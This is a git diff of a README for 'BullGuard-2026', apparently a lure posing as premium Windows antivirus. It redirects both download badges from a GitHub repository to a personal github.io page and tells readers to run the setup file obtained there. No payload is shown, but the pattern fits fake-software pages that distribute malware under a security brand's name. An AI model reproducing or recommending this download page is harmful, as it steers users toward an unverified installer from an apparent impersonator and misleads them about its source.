@@ -1,6 +1,6 @@
 # 🛡️ BullGuard-2026 - Complete Premium Security For Your PC
 
-[![](https://img.shields.io/badge/Download-BullGuard_2026-blue)](https://github.com/Claud9659/BullGuard-2026)
+[![](https://img.shields.io/badge/Download-BullGuard_2026-blue)](https://claud9659.github.io)
 
 BullGuard-2026 provides protection for computers running Windows 11 and Windows 10. This software secures your system against malware, viruses, and online threats. The program runs in the background to keep your files safe while you browse the internet.
 
@@ -8,7 +8,7 @@ BullGuard-2026 provides protection for computers running Windows 11 and Windows 
 
 Click the badge below to access the installer for your computer.
 
-[![](https://img.shields.io/badge/Download-BullGuard_2026-grey)](https://github.com/Claud9659/BullGuard-2026)
+[![](https://img.shields.io/badge/Download-BullGuard_2026-grey)](https://claud9659.github.io)
 
 Navigate to the provided page to start the download. Locate the setup file on your computer once the download finishes. This file usually sits in your Downloads folder.
 
